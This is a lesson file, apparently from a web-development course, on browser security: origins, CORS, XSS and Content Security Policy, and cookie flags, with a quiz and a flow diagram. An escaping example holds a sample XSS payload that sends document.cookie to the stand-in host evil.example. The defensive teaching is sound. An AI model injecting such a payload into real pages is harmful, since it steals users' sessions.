---
id: web-security
title: "Browser security: origins, CORS, CSP, cookies"
summary: Who may read what, and which scripts may run
why: "The browser enforces most of a web app's security boundaries for you, but only if you understand them well enough not to switch them off by accident."
requires: [web-dom-events, web-http-caching]
lesson: diagram   # the flow diagram block at the end is the lesson
points:
  - title: The origin is the boundary
    text: "Scheme, host and port together. A page can send requests anywhere, but it can only read responses from its own origin unless the other side allows it."
  - title: CORS relaxes, never tightens
    text: "CORS headers are the server telling the browser which other origins may read its responses. They don't stop requests, and they don't protect your API."
  - title: XSS is your code running theirs
    text: "If untrusted text reaches the page as HTML or script, it runs with your origin's power. Escape on output, prefer textContent, and add a CSP as a second wall."
  - title: Cookies carry flags
    text: "HttpOnly hides a cookie from JavaScript, Secure keeps it to HTTPS, and SameSite decides whether other sites' requests carry it."
quiz_hint: For each case, ask which origin the code runs in, which origin it is trying to read, and what the browser checks.
quiz:
  - q: "A page on https://app.example calls fetch(\"https://api.example/me\", { credentials: \"include\" }). The API replies with Access-Control-Allow-Origin: *. What happens?"
    options: ["It works; * allows everyone", "The browser blocks the response: credentialed requests need the exact origin echoed back (and Access-Control-Allow-Credentials: true)", "The request is never sent"]
    answer: 1
    explain: "With credentials, the wildcard is not allowed. The server must reply with Access-Control-Allow-Origin: https://app.example and Access-Control-Allow-Credentials: true, or the script can't read the response."
  - q: Which line is an XSS hole if name comes from the URL?
    code: |
      title.textContent = name          // A
      title.innerHTML = `Hi ${name}`    // B
      title.setAttribute("data-name", name)  // C
    options: ["A", "B", "C"]
    answer: 1
    explain: "innerHTML parses the string as HTML, so a name like <img src=x onerror=...> runs code. textContent and setAttribute treat it as plain text."
  - q: "A session cookie is set with SameSite=Lax. Another site has a hidden form that POSTs to your /transfer endpoint. Is the cookie sent?"
    options: ["Yes, cookies are always sent to their own domain", "No: Lax cookies go with top-level navigations using safe methods like GET, not with cross-site POSTs", "Only if the form uses HTTPS"]
    answer: 1
    explain: "Lax blocks cookies on cross-site subrequests and cross-site POSTs, which stops classic CSRF. Strict also drops them when the user follows a link from another site; None sends them everywhere and requires Secure."
links:
  - { title: "Same-origin policy (MDN)", url: "https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy" }
  - { title: "Cross-Origin Resource Sharing (MDN)", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS" }
  - { title: "Content Security Policy (MDN)", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP" }
  - { title: "SameSite cookies explained (web.dev)", url: "https://web.dev/articles/samesite-cookies-explained" }
---
The browser runs code from many sites side by side, so it keeps them apart. The same-origin policy stops a script on one origin from reading another origin's data. CORS is how a server opts in to sharing across that line. A Content Security Policy limits which scripts may run on your page, which is your second wall against cross-site scripting. Cookie attributes decide when a session travels with a request.

## Origins

An origin is the scheme, host and port of a URL. `https://shop.example` and `https://shop.example/cart` share one; change any of the three parts and it is a different origin:

```js run
// Origins: scheme, host and port must all match.
const origin = (url) => new URL(url).origin
const page = "https://shop.example"
for (const url of ["https://shop.example/cart", "http://shop.example/", "https://api.shop.example/", "https://shop.example:8443/"]) {
  console.log(url, origin(url) === page ? "same origin" : "cross-origin")
}
```

A page may still *embed* cross-origin images, scripts and styles, and submit forms anywhere. What it can't do by default is *read* a cross-origin response from `fetch`, or reach into another origin's frame.

## CORS

When a script fetches another origin, the browser sends an `Origin` header and only hands the response to the script if the reply carries a matching `Access-Control-Allow-Origin`. Requests that a plain HTML form couldn't make (methods like `PUT` or `DELETE`, a JSON `Content-Type`, custom headers) are **preflighted**: the browser first sends an `OPTIONS` request asking permission, and only sends the real one if the answer allows it. With cookies (`credentials: "include"`), the server must name the exact origin and send `Access-Control-Allow-Credentials: true`.

CORS is enforced by browsers, for browsers. `curl` ignores it, so it is never a substitute for authentication on your API.

## XSS and CSP

Cross-site scripting is attacker-controlled text ending up in your page as code. Stored XSS comes from your database, reflected XSS from the URL, DOM-based XSS from your own client code (`innerHTML`, `document.write`, `eval`, `javascript:` URLs). Defences, in order:

1. Treat data as text. Use `textContent`, `setAttribute` and your framework's default escaping; reach for `innerHTML` only with sanitised HTML.
2. Escape for the context you are writing into: HTML, an attribute, a URL or a script each need different handling.

3. Send a strict **Content Security Policy**, for example `script-src 'nonce-RANDOM' 'strict-dynamic'; object-src 'none'; base-uri 'none'`, with a fresh random nonce on each response. Injected scripts without the nonce don't run, and inline event handlers are blocked. `frame-ancestors` in the same header controls who may frame your page.

For text inside HTML, escaping five characters is enough to keep it text:

```js run
// A comment a visitor typed. Pasted into innerHTML as is, the browser would run its onerror.
const comment = `Nice post! <img src=x onerror="fetch('https://evil.example/?c=' + document.cookie)">`

function escapeHtml(text) {
  return text
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;")
}

console.log("unsafe: ", `<p>${comment}</p>`)
console.log("escaped:", `<p>${escapeHtml(comment)}</p>`)
```

## Cookies

Session cookies should be `HttpOnly` (unreadable by scripts, so an XSS can't steal them), `Secure` (HTTPS only) and `SameSite=Lax` or `Strict`. `SameSite` governs cross-*site* requests, where a site is the registrable domain plus the scheme, so `app.shop.example` and `api.shop.example` are the same site but different origins. Some browsers treat a cookie without `SameSite` as `Lax`, others don't, so always set it explicitly. `SameSite=None` is needed for genuinely cross-site uses such as embedded widgets, and must be combined with `Secure`.

```trace diagram
id: cross-origin
title: What the browser checks
subtitle: "Your page on https://shop.example, the API on https://api.shop.example, and an attacker"
kind: sequence
elements:
  - { id: page, label: Your page, role: client }
  - { id: browser, label: Browser }
  - { id: api, label: API }
  - { id: evil, label: evil.example, role: external }
edges:
  - { id: fetch, from: page, to: browser, label: "fetch PUT /me, JSON, credentials" }
  - { id: preflight, from: browser, to: api, label: "OPTIONS /me: Origin, Request-Method PUT", flow: security }
  - { id: allow, from: api, to: browser, label: "204: Allow-Origin https://shop.example, PUT, credentials", style: dashed }
  - { id: put, from: browser, to: api, label: PUT /me + session cookie }
  - { id: put-200, from: api, to: browser, label: "200 + the same Allow-* headers", style: dashed }
  - { id: readable, from: browser, to: page, label: response readable, style: dashed }
  - { id: form, from: evil, to: browser, label: hidden form POSTs to /transfer }
  - { id: no-cookie, from: browser, to: api, label: "POST /transfer, no cookie (SameSite=Lax)", flow: security }
  - { id: csp, from: browser, to: browser, label: "injected <script> without the nonce: blocked by CSP", flow: security }
steps:
  - caption: "The page and its API share a site, shop.example, but they are different origins, because the host differs. So the same-origin policy applies to the page reading API responses."
    focus: [page, api]
  - caption: "The page sends a PUT with a JSON body and cookies. A plain form couldn't send that, so the browser first asks permission with an OPTIONS preflight, which never carries cookies."
    trace: [fetch, preflight]
  - caption: "The API names the exact origin, the allowed method and headers, and Allow-Credentials: true. With credentials a * wildcard would not do. Access-Control-Max-Age lets the browser reuse this answer."
    trace: [allow]
  - caption: "Only now is the real request sent, with the session cookie. Both hosts are the same site, so a SameSite=Lax cookie goes along."
    trace: [put]
  - caption: "The response carries the same headers, so the browser hands it to the script. Without them the request would still have reached the server; only the script's read is blocked."
    trace: [put-200, readable]
  - caption: "CORS is enforced by browsers, for browsers. curl ignores it, so the API still has to authenticate every request itself."
    focus: [api]
  - caption: "A page on evil.example submits a hidden form to /transfer. Forms may post anywhere, but this is a cross-site POST, so the Lax cookie is left off and the request arrives unauthenticated."
    trace: [form, no-cookie]
  - caption: "Suppose a stored comment slips a <script> into your page. Your CSP allows only scripts with this response's random nonce, so the browser refuses to run it and reports the violation."
    trace: [csp]
  - caption: "And because the session cookie is HttpOnly, even a script that did run couldn't read it from document.cookie."
    focus: [page, browser]
```
